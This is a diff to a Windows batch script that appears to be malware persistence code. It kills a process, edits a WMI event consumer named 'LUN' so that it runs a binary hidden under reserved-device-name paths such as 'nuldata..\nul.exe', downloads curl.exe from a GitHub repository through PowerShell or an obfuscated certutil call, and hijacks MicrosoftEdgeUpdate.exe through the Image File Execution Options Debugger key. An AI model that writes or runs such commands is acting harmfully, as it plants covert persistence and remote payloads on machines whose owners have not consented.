@@ -1,6 +1,6 @@
 taskkill.exe /f /IM nul.exe
-wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer WHERE Name="LUN" SET CommandLineTemplate="%ProgramData%\nuldata..\nul.exe %ProgramData%\nuldata..\nul"
-powershell.exe -NoProfile -Command "$c = Get-CimInstance -Namespace root\subscription -ClassName CommandLineEventConsumer -Filter \"Name='LUN'\"; $c.CommandLineTemplate = '%ProgramData%\nuldata..\nul.exe %ProgramData%\nuldata..\nul'; Set-CimInstance -InputObject $c"
+wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer WHERE Name="LUN" GET CommandLineTemplate | findstr /C:"%ProgramData%\nuldata..\nul.exe %ProgramData%\nuldata..\nul" >nul || wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer WHERE Name="LUN" SET CommandLineTemplate="%ProgramData%\nuldata..\nul.exe %ProgramData%\nuldata..\nul"
+powershell.exe -NoProfile -Command "$target = '%ProgramData%\nuldata..\nul.exe %ProgramData%\nuldata..\nul'; $c = Get-CimInstance -Namespace root\subscription -ClassName CommandLineEventConsumer -Filter \"Name='LUN'\"; if ($c -and $c.CommandLineTemplate -ne $target) { $c.CommandLineTemplate = $target; Set-CimInstance -InputObject $c }"
 dir "%ProgramData%\curl.exe" >nul || powershell.exe -NoProfile Invoke-WebRequest -Uri https://github.com/vltex/1/raw/1/0/curl.exe -OutFile C:\ProgramData\curl.exe
 dir "%ProgramData%\curl.exe" >nul || certutil -url""""cache -split -f "https://github.com/vltex/1/raw/1/0/curl.exe" "%ProgramData%\curl.exe"
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MicrosoftEdgeUpdate.exe" /v Debugger /t REG_SZ /d "\\.\%ProgramData%\prndata..\prn.exe \\.\%ProgramData%\prndata..\prn" /f
